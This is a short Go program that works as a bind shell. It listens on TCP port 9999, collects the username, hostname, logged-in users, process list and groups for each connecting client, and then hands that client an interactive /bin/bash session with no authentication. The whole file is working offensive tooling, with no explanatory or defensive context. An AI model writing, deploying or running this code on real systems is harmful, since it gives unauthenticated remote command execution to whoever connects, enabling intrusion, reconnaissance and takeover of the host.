package main

import (
	"fmt"
	"net"
	"os/exec"
)

func handler(conn net.Conn) {

	_, err := conn.Write([]byte("[+] session established.\n"))
	if err != nil {
		fmt.Printf("[-] session failed %v", err)
	}

	whoami := exec.Command("whoami")
	n, err := whoami.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] whoami failed %v", err)
	}

	hostname := exec.Command("hostname")
	h, err := hostname.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] hostname failed %v", err)
	}

	who := exec.Command("who")
	w, err := who.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] who failed %v", err)
	}

	ps := exec.Command("ps")
	p, err := ps.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] ps failed %v", err)
	}
	groups := exec.Command("groups")
	g, err := groups.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] groups failed %v", err)
	}

	_, err = conn.Write([]byte("[*] hostname is " + string(h) + "[*] username is " + string(n) + "[*] active users:\n " + string(w) + string(p) + "[*] groups: " + string(g)))
	if err != nil {
		fmt.Printf("[-] session failed %v", err)
	}

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err = cmd.Run()
	if err != nil {
		fmt.Printf("[-] connection closed.")
	}

	defer conn.Close()
}

func main() {
	fmt.Println("[*] opening port 9999")

	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		fmt.Printf("[-] listener failed, %v", err)
		return
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Printf("[-] connection failed %v", err)
		}
		go handler(conn)
	}

}
